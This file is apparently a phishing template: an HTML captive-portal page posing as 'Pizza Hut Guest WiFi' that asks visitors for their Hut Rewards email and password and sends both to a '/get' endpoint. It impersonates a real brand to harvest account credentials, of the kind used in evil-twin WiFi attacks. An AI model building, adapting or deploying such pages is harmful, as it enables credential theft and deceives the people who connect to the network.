<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#EE3124;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.phlogo{text-align:center;margin-bottom:20px}
.phlogo .roof{width:70px;height:35px;margin:0 auto 8px;border-left:35px solid transparent;border-right:35px solid transparent;border-bottom:35px solid #fff}
.phlogo h1{font-size:26px;font-weight:900;color:#fff;letter-spacing:0.5px}
.phlogo p{font-size:11px;color:rgba(255,255,255,0.75);letter-spacing:1.5px;text-transform:uppercase;margin-top:4px}
.card{background:#fff;width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.25)}
.ch{background:#1a1a1a;padding:18px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:800;color:#EE3124}.ch p{font-size:12px;color:#aaa;margin-top:3px}
.cb{padding:24px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#EE3124;box-shadow:0 0 0 3px rgba(238,49,36,0.1)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#EE3124}
.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#EE3124;color:#fff;font-size:14px;font-weight:800;cursor:pointer;margin-top:14px}
</style>
</head>
<body>
<div class="phlogo"><div class="roof"></div><h1>Pizza Hut</h1><p>Now That's Delivering &bull; Free WiFi</p></div>
<div class="card">
  <div class="ch"><h1>Pizza Hut Guest WiFi</h1><p>Sign in with your Hut Rewards account</p></div>
  <div class="cb">
    <form action="/get">
      <label class="lbl">Hut Rewards Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <p class="terms">By connecting you agree to <a href="#">Pizza Hut's Terms of Use</a>.</p>
      <button type="submit" class="btn">Connect to WiFi</button>
    </form>
  </div>
</div>
</body>
</html>
